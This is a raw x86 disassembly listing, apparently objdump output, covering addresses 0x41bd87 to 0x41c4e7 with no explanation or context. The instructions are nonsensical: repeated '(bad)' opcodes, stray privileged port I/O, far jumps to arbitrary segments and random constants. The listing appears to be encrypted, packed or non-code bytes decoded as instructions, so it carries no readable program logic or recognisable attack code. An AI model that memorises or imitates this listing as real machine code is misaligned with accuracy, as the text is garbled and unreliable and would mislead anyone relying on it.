  41bd87:	paddw  mm5,QWORD PTR [ebx-0x5050f783]
  41bd8e:	retf   
  41bd8f:	mov    ds:0x58ef784,al
  41bd94:	mov    edx,0x63421ec7
  41bd99:	(bad)  
  41bd9b:	icebp  
  41bd9c:	push   edi
  41bd9d:	xchg   ebp,eax
  41bd9e:	nop    DWORD PTR [ecx+0x26]
  41bda2:	adc    edx,edx
  41bda4:	enter  0x9ed0,0xaf
  41bda8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bda9:	mov    bh,BYTE PTR [edi]
  41bdab:	xor    bl,bh
  41bdad:	mov    WORD PTR [eax+0x6ea1bfc6],es
  41bdb3:	cmp    edi,ecx
  41bdb5:	jmp    0xa52c5f53
  41bdba:	outs   dx,DWORD PTR ds:[si]
  41bdbc:	pop    es
  41bdbd:	add    bl,BYTE PTR [esi+esi*4+0x1]
  41bdc1:	sub    DWORD PTR [eax],ecx
  41bdc3:	mov    bl,0x2d
  41bdc5:	out    dx,al
  41bdc6:	jecxz  0x41be1f
  41bdc8:	mov    eax,DWORD PTR [eax]
  41bdca:	pop    ebp
  41bdcb:	mov    DWORD PTR [esi+0x4678b885],esi
  41bdd1:	sahf   
  41bdd2:	fwait
  41bdd3:	sub    al,0x45
  41bdd5:	dec    ecx
  41bdd6:	xchg   ecx,edx
  41bdd8:	das    
  41bdd9:	clc    
  41bdda:	nop
  41bddb:	pop    ss
  41bddc:	or     BYTE PTR [edx+0x12870237],bh
  41bde2:	sar    al,1
  41bde4:	xchg   ecx,eax
  41bde5:	cmc    
  41bde6:	stos   DWORD PTR es:[edi],eax
  41bde7:	or     BYTE PTR [eax-0xf9f9711],0xbf
  41bdee:	out    0x6c,al
  41bdf0:	sar    ch,1
  41bdf2:	inc    ecx
  41bdf3:	mov    ch,0x5a
  41bdf5:	add    eax,0x1325e94
  41bdfa:	ins    DWORD PTR es:[edi],dx
  41bdfb:	imul   edx,DWORD PTR [edx],0x61
  41bdfe:	xor    DWORD PTR [edi],0x6d
  41be01:	dec    esi
  41be02:	push   cs
  41be03:	in     al,dx
  41be04:	cli    
  41be05:	into   
  41be06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be07:	dec    eax
  41be08:	fistp  DWORD PTR [edi]
  41be0a:	and    al,0x5a
  41be0c:	pop    ds
  41be0d:	pushf  
  41be0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be0f:	sub    esi,DWORD PTR [ecx]
  41be11:	jge    0x41be45
  41be13:	dec    ebp
  41be14:	cli    
  41be15:	sahf   
  41be16:	xchg   esi,eax
  41be17:	adc    dh,BYTE PTR [edx+0x443e976c]
  41be1d:	jg     0x41be40
  41be1f:	addr16 adc al,0x60
  41be22:	int3   
  41be23:	push   ss
  41be24:	gs icebp 
  41be26:	int3   
  41be27:	(bad)  
  41be28:	je     0x41be3c
  41be2a:	cmp    edi,edi
  41be2c:	pusha  
  41be2d:	pushf  
  41be2e:	cmp    DWORD PTR [esi+0x327a9cdf],esp
  41be34:	rol    BYTE PTR [edi],cl
  41be36:	xor    eax,0xba83c29a
  41be3b:	data16 std 
  41be3d:	add    al,0x9e
  41be3f:	sbb    ah,BYTE PTR [ebp+0x3ae21310]
  41be45:	and    cl,bh
  41be47:	push   esi
  41be48:	sbb    eax,0x116d4ce9
  41be4d:	or     cl,ah
  41be4f:	cdq    
  41be50:	scas   al,BYTE PTR es:[edi]
  41be51:	inc    esi
  41be52:	or     BYTE PTR [edi-0x34613bad],ah
  41be58:	add    esi,edi
  41be5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be5b:	int    0xca
  41be5d:	scas   al,BYTE PTR es:[edi]
  41be5e:	out    0xf1,al
  41be60:	jnp    0x41be70
  41be62:	pop    ecx
  41be63:	ds in  eax,dx
  41be65:	dec    esi
  41be66:	mov    ecx,DWORD PTR [edx-0x8]
  41be69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be6a:	xchg   BYTE PTR ds:0xef5fd282,dh
  41be70:	adc    bl,bh
  41be72:	arpl   WORD PTR [edx+0x45a26123],sp
  41be78:	es (bad) 
  41be7a:	cmp    ah,BYTE PTR [esi-0x60]
  41be7d:	jno    0x41bede
  41be7f:	(bad)  
  41be81:	mov    DWORD PTR ds:0xc550ec32,0x2b9ec671
  41be8b:	add    bl,BYTE PTR es:[ebp+0x6]
  41be8f:	or     al,0x94
  41be91:	push   esp
  41be92:	(bad)  
  41be93:	mov    ebp,0x738c6fc6
  41be98:	xchg   edx,eax
  41be99:	push   ss
  41be9a:	test   al,0xdd
  41be9c:	cld    
  41be9d:	pushf  
  41be9e:	aaa    
  41be9f:	adc    ah,BYTE PTR [edi-0x2]
  41bea2:	cmp    edx,DWORD PTR [ebx+0x57]
  41bea5:	xor    BYTE PTR [esi],ah
  41bea7:	hlt    
  41bea8:	adc    al,0x57
  41beaa:	aaa    
  41beab:	lea    esi,[ebx+0x52]
  41beae:	call   edx
  41beb0:	jecxz  0x41beb4
  41beb2:	fwait
  41beb3:	dec    edx
  41beb4:	or     al,0x91
  41beb6:	xchg   esi,eax
  41beb7:	ja     0x41be44
  41beb9:	aam    0x53
  41bebb:	or     eax,0x87f0e601
  41bec0:	dec    ebp
  41bec1:	jmp    0x41beef
  41bec3:	mov    dh,BYTE PTR [ebp+0x7a]
  41bec6:	out    dx,al
  41bec7:	pop    es
  41bec8:	ret    0xce7
  41becb:	ror    DWORD PTR [esi+0x1d],1
  41bece:	and    esp,DWORD PTR [ebp+0x4684a5ab]
  41bed4:	mov    esi,ds
  41bed6:	fwait
  41bed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bed8:	mov    eax,ds:0x827fbf07
  41bedd:	(bad)
  41bee1:	push   eax
  41bee2:	mov    eax,ds:0xf6e4d4f1
  41bee7:	push   ss
  41bee8:	mov    WORD PTR [edx-0x18],?
  41beeb:	jl     0x41beca
  41beed:	cmp    eax,0xd570e122
  41bef2:	inc    eax
  41bef3:	mov    esi,edi
  41bef5:	mov    edi,cs
  41bef7:	repz adc al,0x95
  41befa:	dec    esp
  41befb:	push   ebx
  41befc:	push   ds
  41befd:	lock xchg BYTE PTR [ebx-0x38],al
  41bf01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf02:	xchg   edi,eax
  41bf03:	or     ebp,DWORD PTR [eax+ebx*4+0x21]
  41bf07:	pop    di
  41bf09:	mov    dh,bl
  41bf0b:	sub    ebp,DWORD PTR [ebx]
  41bf0d:	adc    esi,DWORD PTR [edi]
  41bf0f:	cli    
  41bf10:	outs   dx,DWORD PTR ds:[esi]
  41bf11:	ffree  st(4)
  41bf13:	leave  
  41bf14:	lds    esi,FWORD PTR [edx+0x51e9f3f8]
  41bf1a:	fwait
  41bf1b:	lea    ecx,[edx+0x2152abfc]
  41bf21:	loopne 0x41bf26
  41bf23:	inc    ecx
  41bf24:	jnp    0x41bf07
  41bf26:	or     ch,BYTE PTR [ebp+0xedca9dc]
  41bf2c:	mov    bh,0xce
  41bf2e:	data16 aas 
  41bf30:	jmp    0x99e977ae
  41bf35:	inc    esp
  41bf36:	mov    DWORD PTR [ebx],esp
  41bf38:	enter  0x607b,0xcd
  41bf3c:	cli    
  41bf3d:	dec    ebx
  41bf3e:	stos   BYTE PTR es:[edi],al
  41bf3f:	(bad)  
  41bf40:	test   al,0x4f
  41bf42:	aaa    
  41bf43:	clc    
  41bf44:	jle    0x41bf7c
  41bf46:	pop    ecx
  41bf47:	stos   BYTE PTR es:[edi],al
  41bf48:	sub    BYTE PTR [eax+eiz*2-0x65],bl
  41bf4c:	mov    bh,0x2b
  41bf4e:	lods   al,BYTE PTR ds:[esi]
  41bf4f:	int    0xd5
  41bf51:	jb     0x41bf44
  41bf53:	jno    0x41bfc8
  41bf55:	jecxz  0x41befb
  41bf57:	xchg   ecx,eax
  41bf58:	mov    ecx,0x5367cd9e
  41bf5d:	jmp    0x41bf82
  41bf5f:	push   0x981cf22f
  41bf64:	xlat   BYTE PTR ds:[ebx]
  41bf65:	mov    ds:0x536d7d2c,al
  41bf6a:	sbb    edx,edx
  41bf6c:	je     0x41bf36
  41bf6e:	repnz mov esp,0xe1a91605
  41bf74:	xchg   esp,eax
  41bf75:	or     eax,0x3356e6d7
  41bf7a:	call   0x4f0dac4f
  41bf7f:	inc    ecx
  41bf80:	fidivr DWORD PTR [edx-0x9]
  41bf83:	aad    0x93
  41bf85:	xchg   edx,eax
  41bf86:	data16 outs dx,BYTE PTR ds:[esi]
  41bf88:	cmc    
  41bf89:	ret    
  41bf8a:	push   ebp
  41bf8b:	dec    DWORD PTR [edi]
  41bf8d:	dec    ebp
  41bf8e:	mov    BYTE PTR [ecx-0x24],cl
  41bf91:	xor    DWORD PTR [ebp+0x4a],ebx
  41bf94:	jb     0x41bf1f
  41bf96:	loope  0x41bf4b
  41bf98:	fstp   DWORD PTR [edi]
  41bf9a:	clc    
  41bf9b:	scas   eax,DWORD PTR es:[edi]
  41bf9c:	scas   al,BYTE PTR es:[edi]
  41bf9d:	fnsave [ebx]
  41bf9f:	dec    esp
  41bfa0:	(bad)  
  41bfa1:	cmp    al,BYTE PTR [eax]
  41bfa3:	data16 lahf 
  41bfa5:	sbb    BYTE PTR [edi],ch
  41bfa7:	mov    dl,0x97
  41bfa9:	and    bh,BYTE PTR [edi+0x53998c20]
  41bfaf:	je     0x41c00d
  41bfb1:	aaa    
  41bfb2:	rcr    BYTE PTR [ebp+eiz*8-0x67563aae],1
  41bfb9:	ret    
  41bfba:	push   esi
  41bfbb:	xor    DWORD PTR [edi+edx*8+0x7e],ebx
  41bfbf:	into   
  41bfc0:	(bad)  
  41bfc2:	cmp    al,0x72
  41bfc4:	in     eax,dx
  41bfc5:	lds    esi,FWORD PTR [ebx+0x2a]
  41bfc8:	dec    ecx
  41bfc9:	xchg   ebp,eax
  41bfca:	(bad)  
  41bfcb:	dec    ebp
  41bfcc:	shl    dh,1
  41bfce:	jp     0x41c038
  41bfd0:	(bad)  
  41bfd1:	mov    dh,0x56
  41bfd3:	into   
  41bfd4:	inc    edx
  41bfd5:	mov    edi,0xe80cf162
  41bfda:	jmp    0xd04bc447
  41bfdf:	xchg   DWORD PTR [ebp+0x6a74d11f],esp
  41bfe5:	ret    
  41bfe6:	rcl    edi,0xf1
  41bfe9:	sub    eax,0xa48b5937
  41bfee:	push   edi
  41bfef:	mov    DWORD PTR [eax],eax
  41bff1:	and    eax,0xd74e98b0
  41bff6:	jmp    0x185f:0xc11aebd4
  41bffd:	into   
  41bffe:	mov    edi,0xbd3e34ec
  41c003:	pop    ecx
  41c004:	jnp    0x41c078
  41c006:	push   esp
  41c007:	add    BYTE PTR ds:0xa1f59fa2,dl
  41c00d:	sahf   
  41c00e:	sub    BYTE PTR [esi-0x5f7a956d],bl
  41c014:	mov    ds:0x1e50f4f,eax
  41c019:	lods   eax,DWORD PTR ds:[esi]
  41c01a:	adc    eax,0x4c
  41c01d:	push   ebx
  41c01e:	push   0x35
  41c020:	nop
  41c021:	xchg   esi,eax
  41c022:	and    ebx,esi
  41c024:	test   DWORD PTR [eax-0x4bd031ad],eax
  41c02a:	pop    esi
  41c02b:	shl    DWORD PTR [edi+ecx*2],1
  41c02e:	dec    esp
  41c02f:	ret    0x5176
  41c032:	adc    al,0xfd
  41c035:	pop    ds
  41c036:	push   ds
  41c037:	and    ebx,DWORD PTR [edi]
  41c039:	sbb    bh,bl
  41c03b:	fldcw  WORD PTR [ecx-0x5fa68f32]
  41c041:	dec    esi
  41c042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c043:	ds adc ah,al
  41c046:	mov    ds:0x97629b22,al
  41c04b:	pop    edx
  41c04c:	mov    edx,0x759e8ff0
  41c051:	sub    BYTE PTR [esi+0x7becf21a],dl
  41c057:	pop    ss
  41c058:	loop   0x41c0d2
  41c05a:	scas   eax,DWORD PTR es:[edi]
  41c05b:	mov    WORD PTR [edi+0x3],fs
  41c05e:	outs   dx,DWORD PTR ds:[esi]
  41c05f:	mov    es,WORD PTR [edi+0x2ecba986]
  41c065:	or     eax,0xf1455a19
  41c06a:	jno    0x41c042
  41c06c:	retf   
  41c06d:	test   eax,0x9323dd46
  41c072:	and    eax,0xae4d23c1
  41c077:	aad    0xfa
  41c079:	mov    ecx,0xf4bc3f
  41c07e:	add    BYTE PTR [eax],al
  41c080:	add    BYTE PTR [eax],al
  41c082:	mov    dh,0x3a
  41c084:	out    0x1,eax
  41c086:	out    dx,eax
  41c087:	(bad)  
  41c089:	mov    edi,0xdf2dff43
  41c08e:	lock mov esi,0x3c680a69
  41c094:	add    DWORD PTR [eax],eax
  41c096:	repz add al,0x0
  41c099:	add    BYTE PTR [eax-0x1e987c52],dl
  41c09f:	stos   DWORD PTR es:[edi],eax
  41c0a0:	fistp  QWORD PTR [esi-0x18]
  41c0a3:	out    0xa0,eax
  41c0a5:	push   ebx
  41c0a6:	lahf   
  41c0a7:	cmp    DWORD PTR [ecx],0xe
  41c0aa:	mov    esi,es
  41c0ac:	nop
  41c0ad:	fwait
  41c0ae:	sub    eax,0xe517d82e
  41c0b3:	call   0xc0a14a43
  41c0b8:	fst    DWORD PTR [edx]
  41c0ba:	je     0x41c10b
  41c0bc:	scas   eax,DWORD PTR es:[edi]
  41c0bd:	adc    BYTE PTR [edx],dl
  41c0bf:	loope  0x41c0a3
  41c0c1:	(bad)  
  41c0c2:	or     al,0x23
  41c0c4:	call   0x5826169d
  41c0c9:	icebp  
  41c0ca:	sub    BYTE PTR [ebp+ecx*4-0x72],dl
  41c0ce:	sub    edi,DWORD PTR [esi+0x62]
  41c0d1:	push   esi
  41c0d2:	or     cl,BYTE PTR [ebx]
  41c0d4:	stc    
  41c0d5:	mov    edi,0x4af0fb08
  41c0da:	inc    edx
  41c0db:	(bad)  
  41c0dd:	je     0x41c09f
  41c0df:	xchg   esi,eax
  41c0e0:	xor    al,0x7
  41c0e2:	mov    ebx,0xaeef32d9
  41c0e7:	test   BYTE PTR [di+0x2],ah
  41c0eb:	bnd je 0x41c111
  41c0ee:	inc    ebp
  41c0ef:	aaa    
  41c0f0:	or     al,0x8b
  41c0f2:	add    BYTE PTR [eax-0x2d],bh
  41c0f5:	repnz daa 
  41c0f7:	int    0xe8
  41c0f9:	inc    ebx
  41c0fa:	add    bl,BYTE PTR [edi-0x5e]
  41c0fd:	(bad)  
  41c0fe:	nop
  41c0ff:	xor    bh,bh
  41c101:	cs pop edi
  41c103:	ficom  DWORD PTR [edi-0x74]
  41c106:	xor    edx,DWORD PTR [edx+ebp*8]
  41c109:	push   edi
  41c10a:	push   edx
  41c10b:	xchg   ebx,eax
  41c10c:	ror    cl,1
  41c10e:	fld    DWORD PTR [esi-0x74]
  41c111:	sub    eax,0xae773a6f
  41c116:	adc    BYTE PTR [eax+0x5e],ch
  41c119:	xchg   esi,eax
  41c11a:	xor    bh,BYTE PTR [eax]
  41c11c:	sbb    ah,BYTE PTR [esi+ebp*8]
  41c11f:	adc    eax,0xd9ea40c5
  41c124:	mov    al,ds:0xd1ec40c1
  41c129:	or     dh,0x36
  41c12c:	fdiv   st(3),st
  41c12e:	imul   edi,DWORD PTR [edx+0x45],0x5c3a2d6f
  41c135:	mov    WORD PTR [ecx-0x57efeb13],ss
  41c13b:	shr    DWORD PTR [esi],cl
  41c13d:	dec    ecx
  41c13e:	ins    BYTE PTR es:[edi],dx
  41c13f:	mov    ds:0x487470e,al
  41c144:	in     al,0xf5
  41c146:	mov    al,0x4
  41c148:	popf   
  41c149:	push   cs
  41c14a:	inc    ecx
  41c14b:	fimul  DWORD PTR [edi]
  41c14d:	jmp    0x791e15be
  41c152:	adc    bl,0xae
  41c155:	ja     0x41c0fa
  41c157:	in     eax,0x77
  41c159:	add    ebp,DWORD PTR [ebp-0x1bba2adb]
  41c15f:	imul   esp,edi,0xe
  41c162:	es dec ecx
  41c164:	sahf   
  41c165:	or     DWORD PTR [eax],0x9c80e2f9
  41c16b:	cmp    eax,0xdf616bf5
  41c170:	or     BYTE PTR [ebx+eiz*2+0x5c],0xb2
  41c175:	popa   
  41c176:	(bad)  
  41c177:	pop    eax
  41c178:	mov    dh,0x10
  41c17a:	out    dx,eax
  41c17b:	mov    ch,0x90
  41c17d:	in     al,dx
  41c17e:	sub    BYTE PTR [ecx+0x7ce7e417],cl
  41c184:	cmp    bl,dh
  41c186:	pop    ebp
  41c187:	adc    eax,0x8f403b6d
  41c18c:	pinsrw mm7,WORD PTR [edi],0x14
  41c190:	dec    edx
  41c191:	push   es
  41c192:	ret    0x833
  41c195:	sbb    esi,DWORD PTR ds:0x2a843ec0
  41c19b:	cld    
  41c19c:	sub    al,BYTE PTR [eax+0x5a7b6ff7]
  41c1a2:	fidiv  DWORD PTR [ecx]
  41c1a4:	scas   al,BYTE PTR es:[edi]
  41c1a5:	xchg   ebp,ecx
  41c1a7:	es js  0x41c190
  41c1aa:	and    DWORD PTR [edi+0x72cbae5a],esp
  41c1b0:	stc    
  41c1b1:	inc    ebp
  41c1b2:	push   cs
  41c1b3:	add    edx,ecx
  41c1b5:	adc    al,0xd6
  41c1b7:	cmp    BYTE PTR [edi+0x5c4eb510],dh
  41c1bd:	sub    esi,DWORD PTR [eax+0xc]
  41c1c0:	neg    BYTE PTR [ebx-0x42]
  41c1c3:	jge    0x41c226
  41c1c5:	mov    ds:0x4145490d,al
  41c1ca:	push   ds
  41c1cb:	adc    bx,WORD PTR [ecx+0x2b]
  41c1cf:	inc    edx
  41c1d0:	or     al,0x17
  41c1d2:	or     DWORD PTR [ecx-0x10],eax
  41c1d5:	lods   eax,DWORD PTR ds:[esi]
  41c1d6:	mov    ds:0x469e517c,eax
  41c1db:	or     BYTE PTR ds:0x37356b0,bl
  41c1e1:	inc    ebx
  41c1e2:	add    al,0xe5
  41c1e4:	lock mov cl,0x13
  41c1e7:	dec    BYTE PTR [ecx]
  41c1e9:	push   eax
  41c1ea:	outs   dx,BYTE PTR ds:[esi]
  41c1eb:	pop    ebx
  41c1ec:	sub    bl,BYTE PTR [ecx+0x53]
  41c1ef:	test   eax,0x793a1934
  41c1f5:	push   edi
  41c1f6:	hlt    
  41c1f7:	loopne 0x41c1f3
  41c1f9:	or     dh,cl
  41c1fb:	sbb    DWORD PTR es:[edx+0x55008762],esp
  41c202:	push   0xee5bcc20
  41c207:	addr16 cmc 
  41c209:	call   0xc4d586a0
  41c20e:	lds    ebx,FWORD PTR [ebp+0x4a9d3e9d]
  41c214:	adc    eax,0x44482c09
  41c219:	pushf  
  41c21a:	in     al,0x32
  41c21c:	adc    eax,DWORD PTR [ebp+0x64182eb7]
  41c222:	ins    DWORD PTR es:[edi],dx
  41c223:	and    ebx,DWORD PTR [edi+0x22711b42]
  41c229:	lods   al,BYTE PTR ds:[esi]
  41c22a:	bound  esp,QWORD PTR [ebx+ebx*8]
  41c22d:	test   DWORD PTR [esi],esp
  41c22f:	jecxz  0x41c297
  41c231:	mov    cl,0x21
  41c233:	push   ss
  41c234:	rcl    DWORD PTR [ebx-0x80],1
  41c237:	repnz nop
  41c239:	sub    BYTE PTR [edx],ch
  41c23b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c23c:	(bad)  
  41c23d:	mov    edx,0xaf167a88
  41c242:	jle    0x41c1d9
  41c244:	pop    ebx
  41c245:	mov    dh,BYTE PTR [eax+0x49]
  41c248:	dec    ebp
  41c249:	push   ss
  41c24a:	xor    al,0x98
  41c24c:	dec    edi
  41c24d:	mov    al,0x6d
  41c24f:	mov    ah,0x46
  41c251:	sub    ecx,DWORD PTR [esi+0x31341d71]
  41c257:	fldenv ds:0x5f45068e
  41c25d:	enter  0x6df3,0x13
  41c261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c262:	dec    esi
  41c263:	or     al,0x29
  41c265:	sub    al,0x73
  41c267:	jns    0x41c1f1
  41c269:	fs jge 0x41c2b1
  41c26c:	mov    eax,ds:0xb4a1ba6a
  41c271:	mov    al,0x6c
  41c273:	and    DWORD PTR [eax+0x2f],0x3d681a0c
  41c27a:	rcr    BYTE PTR [eax],0x72
  41c27d:	mov    ch,0xa5
  41c27f:	test   al,0x81
  41c281:	pusha  
  41c282:	mov    ch,0x24
  41c284:	mov    ebx,0x938bb2ad
  41c289:	icebp  
  41c28a:	leave  
  41c28b:	mov    ch,0x30
  41c28d:	pusha  
  41c28e:	sbb    DWORD PTR [ecx],ebx
  41c290:	cmp    bl,bh
  41c292:	xor    eax,0xd5d492dd
  41c297:	pop    ebp
  41c298:	div    BYTE PTR [ecx-0x56162ae7]
  41c29e:	mov    ds:0x857f49a0,al
  41c2a3:	mov    ebp,0xaffb29c7
  41c2a8:	test   BYTE PTR [ecx],0xb3
  41c2ab:	or     al,0xe1
  41c2ad:	pusha  
  41c2ae:	pop    ds
  41c2af:	adc    esp,DWORD PTR [edi]
  41c2b1:	xchg   edi,eax
  41c2b2:	nop
  41c2b3:	loope  0x41c29f
  41c2b5:	mov    bh,0x9e
  41c2b7:	(bad)  
  41c2b9:	mov    dl,0x39
  41c2bb:	gs je  0x41c2f5
  41c2be:	scas   eax,DWORD PTR es:[edi]
  41c2bf:	sbb    DWORD PTR [edi-0x4d],0x79703116
  41c2c6:	sbb    bh,BYTE PTR ds:0xb5243bf9
  41c2cc:	push   ebx
  41c2cd:	in     eax,0x46
  41c2cf:	xor    ah,BYTE PTR [esi]
  41c2d1:	rcl    DWORD PTR [ebx],cl
  41c2d3:	xchg   ebp,eax
  41c2d4:	retf   0x59db
  41c2d7:	mov    BYTE PTR [ebx+0x29],al
  41c2da:	ds pop ds
  41c2dc:	sub    ch,BYTE PTR [ebp-0x777da31b]
  41c2e2:	push   esi
  41c2e3:	test   ebp,eax
  41c2e5:	loop   0x41c2c4
  41c2e7:	test   eax,0x2a236e0f
  41c2ec:	adc    al,0xef
  41c2ee:	gs mov cl,0x19
  41c2f1:	push   edx
  41c2f2:	and    edx,ebx
  41c2f4:	or     eax,0xe907bc40
  41c2f9:	mov    cl,0x26
  41c2fb:	and    DWORD PTR [ebp-0x22da5c9e],0xffffffcc
  41c302:	adc    esi,DWORD PTR [eax+0x34]
  41c305:	fild   QWORD PTR [esp+esi*4-0x7f]
  41c309:	ror    esi,1
  41c30b:	jmp    0x41c31b
  41c30d:	das    
  41c30e:	push   ecx
  41c30f:	adc    esp,DWORD PTR [ebp+0x71a82f9a]
  41c315:	cwde   
  41c316:	sbb    BYTE PTR [ebp+edx*8-0x53],ch
  41c31a:	pop    edi
  41c31b:	mov    ch,0x28
  41c31d:	ret    
  41c31e:	sbb    DWORD PTR ds:[edi+ebp*4],ebp
  41c322:	iret   
  41c323:	sub    ecx,DWORD PTR [ecx]
  41c325:	cld    
  41c326:	(bad)  
  41c327:	and    bl,dh
  41c329:	and    DWORD PTR [ecx-0x486445c0],0x83d1a917
  41c333:	jl     0x41c2e6
  41c335:	push   esi
  41c336:	ins    BYTE PTR es:[edi],dx
  41c337:	rcl    BYTE PTR [esi+0x53],cl
  41c33a:	stc    
  41c33b:	out    dx,al
  41c33c:	int3   
  41c33d:	inc    esi
  41c33e:	mov    bh,0x1f
  41c340:	adc    cl,BYTE PTR [eax+ebx*8]
  41c343:	xchg   ebx,eax
  41c344:	push   eax
  41c345:	call   0x35f66f30
  41c34a:	or     ecx,esi
  41c34c:	ficomp DWORD PTR [ebx+0x7bd8eb58]
  41c352:	stos   BYTE PTR es:[edi],al
  41c353:	sbb    ebp,ebx
  41c355:	ins    DWORD PTR es:[edi],dx
  41c356:	in     al,0xc1
  41c358:	jg     0x41c30d
  41c35a:	pushf  
  41c35b:	imul   edi,eax,0xeee7012a
  41c361:	pop    es
  41c362:	xor    al,0xe4
  41c364:	sti    
  41c365:	stos   DWORD PTR es:[edi],eax
  41c366:	retf   
  41c367:	pop    eax
  41c368:	dec    ecx
  41c369:	sbb    ecx,ebp
  41c36b:	int3   
  41c36c:	mov    dl,0x71
  41c36e:	jmp    0x41c387
  41c370:	mov    dl,0x3f
  41c372:	fcomp  DWORD PTR [esi-0x3e1dcf63]
  41c378:	pop    es
  41c379:	dec    ebx
  41c37a:	adc    al,BYTE PTR [ecx]
  41c37c:	(bad)  
  41c37d:	leave  
  41c37e:	and    DWORD PTR [edi],ecx
  41c380:	mov    eax,ds:0x889e83f9
  41c385:	ds adc eax,0x86c49ab5
  41c38b:	pop    ss
  41c38c:	out    dx,eax
  41c38d:	shl    DWORD PTR [eax-0x60],1
  41c390:	dec    ebp
  41c391:	pop    ebp
  41c392:	pop    ss
  41c393:	dec    ecx
  41c394:	push   ebp
  41c395:	sahf   
  41c396:	cmp    BYTE PTR [edi+eiz*8],al
  41c399:	sar    DWORD PTR ds:0xbe8ea360,cl
  41c39f:	mov    esp,0x3a9cf59d
  41c3a4:	push   ebp
  41c3a5:	sbb    bl,dh
  41c3a7:	les    esp,FWORD PTR [edi]
  41c3a9:	inc    ebp
  41c3aa:	ret    
  41c3ab:	in     eax,dx
  41c3ac:	jmp    0x8667:0x7d3cbc52
  41c3b3:	push   esi
  41c3b4:	dec    edi
  41c3b5:	fs ds addr16 cmp al,0xd0
  41c3ba:	push   esi
  41c3bb:	pusha  
  41c3bc:	cli    
  41c3bd:	clc    
  41c3be:	mov    al,ds:0xc6ae1998
  41c3c3:	mov    esi,0x53b051b8
  41c3c8:	xchg   BYTE PTR [edi],bl
  41c3ca:	or     edx,DWORD PTR [eax+0x8]
  41c3cd:	jbe    0x38210956
  41c3d3:	into   
  41c3d4:	jmp    0xa783:0x6b8fa6e8
  41c3db:	test   DWORD PTR [esp+ebx*2],0x415a4429
  41c3e2:	jb     0x41c384
  41c3e4:	xchg   esp,eax
  41c3e5:	mov    eax,ds:0x2a6c8b37
  41c3ea:	repz ret 0x89ad
  41c3ee:	loopne 0x41c437
  41c3f0:	cmp    esp,DWORD PTR [ebp-0x31]
  41c3f3:	jmp    0xad832064
  41c3f8:	arpl   WORD PTR [esp+edx*1-0x6b],di
  41c3fc:	jecxz  0x41c413
  41c3fe:	and    ah,BYTE PTR [esi]
  41c400:	inc    ecx
  41c401:	out    0x42,al
  41c403:	lahf   
  41c404:	mov    cl,0x11
  41c406:	out    0xae,al
  41c408:	mov    ds:0x8a02a9bf,al
  41c40d:	not    DWORD PTR [ebx+ebx*2-0x72]
  41c411:	jmp    0x24cf:0xb4c6deaf
  41c418:	mov    cl,0x93
  41c41a:	aas    
  41c41b:	in     al,0x35
  41c41d:	cmp    bl,dl
  41c41f:	mov    ebp,ecx
  41c421:	(bad)  
  41c423:	and    eax,ecx
  41c425:	fdivr  QWORD PTR [edi]
  41c427:	jmp    0x41c49c
  41c429:	jbe    0x41c3f1
  41c42b:	sub    bl,BYTE PTR [edi]
  41c42d:	add    edi,DWORD PTR [edi+0x9]
  41c430:	test   BYTE PTR [esp+eiz*4-0x56],ch
  41c434:	out    0x7e,al
  41c436:	shl    cl,0x8
  41c439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c43a:	stos   BYTE PTR es:[edi],al
  41c43b:	imul   ebx,DWORD PTR [edi+0x51075e42],0xbe7db103
  41c445:	stos   BYTE PTR es:[edi],al
  41c446:	stos   BYTE PTR es:[edi],al
  41c447:	adc    ebx,ecx
  41c449:	ret    0xcaeb
  41c44c:	xchg   edi,eax
  41c44d:	xchg   ecx,eax
  41c44e:	mov    dl,0xdb
  41c450:	dec    edi
  41c451:	mov    ecx,0xbdaf4e85
  41c456:	xor    esi,edi
  41c458:	pop    esi
  41c459:	aas    
  41c45a:	xor    ebp,DWORD PTR [ecx-0x3f5bb4cc]
  41c460:	mov    BYTE PTR [ecx-0x2c95451a],al
  41c466:	jmp    0xddda:0x6944cc79
  41c46d:	into   
  41c46e:	test   BYTE PTR [eax-0x62],bh
  41c471:	ret    
  41c472:	addr16 fs mov bl,0xf3
  41c476:	fist   DWORD PTR [edi-0x10]
  41c479:	(bad)  
  41c47a:	pop    edx
  41c47b:	sbb    BYTE PTR [ecx],0x7f
  41c47e:	push   cs
  41c47f:	push   cs
  41c480:	sbb    BYTE PTR ds:0x5bf4e5fd,ch
  41c486:	fsub   st,st(3)
  41c488:	es push ecx
  41c48a:	sub    edi,esp
  41c48c:	sbb    al,0xd8
  41c48e:	fcomp  QWORD PTR [esi-0x6a78d2cc]
  41c494:	sti    
  41c495:	sbb    bh,BYTE PTR [ecx-0x1bfb23aa]
  41c49b:	stos   DWORD PTR es:[edi],eax
  41c49c:	xchg   esi,eax
  41c49d:	hlt    
  41c49e:	in     al,dx
  41c49f:	fadd   DWORD PTR [eax-0x7c]
  41c4a2:	fisttp WORD PTR [eax+ecx*1]
  41c4a5:	jbe    0x41c452
  41c4a7:	imul   esi,DWORD PTR [ebx+edi*1-0x66],0x1aebd6a7
  41c4af:	sub    cl,dl
  41c4b1:	cmp    edi,ecx
  41c4b3:	inc    esi
  41c4b4:	pop    ebp
  41c4b5:	dec    ebx
  41c4b6:	ret    
  41c4b7:	inc    edi
  41c4b8:	mov    bl,0x41
  41c4ba:	aaa    
  41c4bb:	psubusb mm0,mm5
  41c4be:	adc    DWORD PTR [ebp+0x67],0x7e55c477
  41c4c5:	and    edx,edi
  41c4c7:	(bad)  
  41c4c8:	push   edx
  41c4c9:	gs ss ret 
  41c4cc:	imul   ecx,DWORD PTR [edi],0xbc4af85e
  41c4d2:	jg     0x41c52d
  41c4d4:	inc    ebx
  41c4d5:	in     al,0x62
  41c4d7:	xchg   esi,eax
  41c4d8:	ins    WORD PTR es:[edi],dx
  41c4da:	mov    BYTE PTR [ecx-0xa9714bf],dl
  41c4e0:	jmp    0xa93e3d33
  41c4e5:	sbb    ecx,ecx
  41c4e7:	mov    ch,0x95
